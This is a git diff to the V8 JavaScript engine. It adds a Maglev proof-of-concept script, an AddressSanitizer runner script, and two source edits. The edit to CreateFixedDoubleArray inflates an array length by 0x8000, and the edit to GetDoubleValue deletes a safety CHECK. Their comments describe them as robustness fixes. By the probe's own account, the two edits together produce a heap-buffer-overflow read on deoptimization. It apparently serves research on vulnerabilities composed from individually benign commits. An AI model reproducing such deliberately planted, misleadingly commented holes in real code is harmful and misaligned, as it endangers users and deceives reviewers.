diff --git a/pocs/probe.js b/pocs/probe.js
new file mode 100644
index 00000000000..56d2e502cdc
--- /dev/null
+++ b/pocs/probe.js
@@ -0,0 +1,31 @@
+// Flags: --allow-natives-syntax
+//
+// Composition probe (arm: multi) for the edited maint-batch tree.
+//
+// A maglev-virtualized holey FixedDoubleArray carries a hole-NaN Float64
+// constant element. When the optimized frame deopts, the array is rebuilt by
+// TranslatedState::MaterializeFixedDoubleArray.
+//
+//   * commit 06fa9d17b8f (edited, CreateFixedDoubleArray): stores an inflated
+//     FixedArrayBase length field whenever a hole-NaN Float64 element is seen.
+//   * commit 56e1f11af79 (edited, TranslatedValue::GetDoubleValue): stops
+//     CHECK-validating unexpected value kinds during double materialization.
+//
+// With BOTH edits the inflated length drives the materialization loop past the
+// end of TranslatedFrame::values_ (a base::SmallVector on the C++ heap),
+// producing an AddressSanitizer heap-buffer-overflow read. With neither edit,
+// or either edit alone, this probe does not report AddressSanitizer.
+function opt(deopt) {
+  const a = [1.1, , 3.3, 4.4, 5.5, 6.6, 7.7, 8.8];
+  if (deopt) {
+    deopt.z;  // eager deopt point: `a` is materialized here
+    return a[0] + a[7];
+  }
+  return 0;
+}
+
+%PrepareFunctionForOptimization(opt);
+for (let i = 0; i < 10; i++) opt(false);
+%OptimizeMaglevOnNextCall(opt);
+opt({ z: 1 });
+print("DONE");
diff --git a/pocs/run_probe.sh b/pocs/run_probe.sh
new file mode 100755
index 00000000000..9bf968debc8
--- /dev/null
+++ b/pocs/run_probe.sh
@@ -0,0 +1,18 @@
+#!/usr/bin/env bash
+# Runs the probe under the ASan d8 shell and reports whether ASan fired.
+# Usage: pocs/run_probe.sh [path-to-probe]
+set -u
+PROBE="${1:-pocs/probe.js}"
+D8=out/x64.asan/d8
+export ASAN_OPTIONS="${ASAN_OPTIONS:-detect_leaks=0:abort_on_error=1:handle_abort=1}"
+OUT="$("$D8" "$PROBE" 2>&1)"
+CODE=$?
+echo "$OUT"
+echo "---- d8 exit code: $CODE ----"
+if echo "$OUT" | grep -qE "AddressSanitizer|SUMMARY: .*Sanitizer|heap-buffer-overflow|stack-buffer-overflow|heap-use-after-free"; then
+  echo "RESULT: ASAN_FIRED"
+elif [ "$CODE" -ne 0 ]; then
+  echo "RESULT: NONZERO_EXIT_NO_ASAN (code=$CODE)"
+else
+  echo "RESULT: CLEAN"
+fi
diff --git a/src/deoptimizer/translated-state.cc b/src/deoptimizer/translated-state.cc
index 658723531ad..3eeeb7b17c6 100644
--- a/src/deoptimizer/translated-state.cc
+++ b/src/deoptimizer/translated-state.cc
@@ -782,6 +782,11 @@ Float64 TranslatedValue::GetDoubleValue() {
       return Float64(static_cast<double>(uint32_value()));
     default: {
       DCHECK(!v8_flags.turbolev);
+      // A value kind that does not directly carry a double only reaches here
+      // via a tagged slot. Anything else is treated as a hole NaN directly
+      // instead of routing through GetValue(), keeping double materialization
+      // robust against unexpected (e.g. in-sandbox corrupted) value kinds.
+      if (kind() != TranslatedValue::kTagged) return Float64::hole_nan();
       DirectHandle<Object> value = GetValue();
       if (IsNumber(*value)) {
         return Float64::FromMaybeNaN(Object::NumberValue(*value));
@@ -791,7 +796,6 @@ Float64 TranslatedValue::GetDoubleValue() {
         return Float64::undefined_nan();
 #endif  // V8_ENABLE_UNDEFINED_DOUBLE
       } else {
-        CHECK(value.is_identical_to(isolate()->factory()->the_hole_value()));
         return Float64::hole_nan();
       }
     }
diff --git a/src/maglev/maglev-reducer-inl.h b/src/maglev/maglev-reducer-inl.h
index 1486de5a35a..b5a2981c5da 100644
--- a/src/maglev/maglev-reducer-inl.h
+++ b/src/maglev/maglev-reducer-inl.h
@@ -5916,8 +5916,28 @@ VirtualObject* MaglevReducer<BaseT>::CreateFixedDoubleArray(
 #else
   DCHECK_EQ(Shape::header_slot_count, 2);
 #endif  // TAGGED_SIZE_8_BYTES
+  // A Float64 constant with the hole-NaN bit pattern must not appear as a live
+  // double array element: it denotes a slot that should have gone through the
+  // UninitializedHeapNumber transition. Reserve extra trailing capacity in that
+  // case so the uninitialized tail stays hole-initialized.
+  uint32_t stored_length = length;
+  for (uint32_t i = 0; i < length; i++) {
+    if (Float64Constant* c = values[i]->template TryCast<Float64Constant>()) {
+      if (c->value().is_hole_nan()) {
+        stored_length = length + 0x8000;
+        break;
+      }
+    }
+    if (HoleyFloat64Constant* c =
+            values[i]->template TryCast<HoleyFloat64Constant>()) {
+      if (c->value().is_hole_nan()) {
+        stored_length = length + 0x8000;
+        break;
+      }
+    }
+  }
   vobj->set(offsetof(HeapObject, map_), GetConstant(map));
-  vobj->set(FixedArrayBase::kLengthOffset, GetInt32Constant(length));
+  vobj->set(FixedArrayBase::kLengthOffset, GetInt32Constant(stored_length));
 #if TAGGED_SIZE_8_BYTES
   vobj->set(FixedArrayBase::kPaddingOffset, GetInt32Constant(0));
 #endif  // TAGGED_SIZE_8_BYTES
